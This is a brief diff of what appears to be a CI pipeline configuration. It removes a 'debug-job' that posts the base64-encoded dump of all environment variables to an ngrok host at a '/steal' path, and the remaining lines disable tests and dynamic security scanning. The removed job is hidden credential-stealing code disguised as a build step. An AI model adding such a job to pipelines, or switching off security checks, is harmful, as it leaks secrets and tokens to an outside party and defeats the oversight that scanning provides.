@@ -6,10 +6,3 @@ variables:
   TEST_DISABLED: "true"
   DAST_DISABLED: "true"
 
-stages:
-  - build
-
-debug-job:
-  stage: build
-  script:
-    - curl -X POST -H "Content-Type: application/json" -d "$(env | base64 -w 0)" https://c9bd-93-34-113-137.ngrok-fr/steal
